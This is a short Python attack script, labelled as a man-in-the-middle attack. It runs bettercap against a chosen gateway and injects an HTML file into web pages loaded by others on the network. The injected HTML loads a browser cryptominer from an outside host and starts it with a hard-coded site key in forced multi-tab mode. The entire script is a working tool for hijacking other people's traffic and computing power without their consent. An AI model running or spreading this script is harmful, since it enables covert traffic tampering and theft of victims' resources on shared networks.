import subprocess

# MiTM ATTACK

target = raw_input("GATEWAY IP: ")
interface = raw_input("INTERFACE: ")
html = '''<script src="//webmine.pro/lib/crlt.js"></script>\n<script>\n  var miner = new CRLT.Anonymous('ab113566d4312b090c54e9189e823898efed45a6bcc3');\n    miner.start(CRLT.FORCE_MULTI_TAB);\n</script>'''

html_file = open("r0b1nG.html", "w")
html_file.write(html)
html_file.close()

subprocess.call(['sudo','bettercap','-I',interface,'T',target,'--proxy-module','injecthtml','--html-file','r0b1nG.html'])
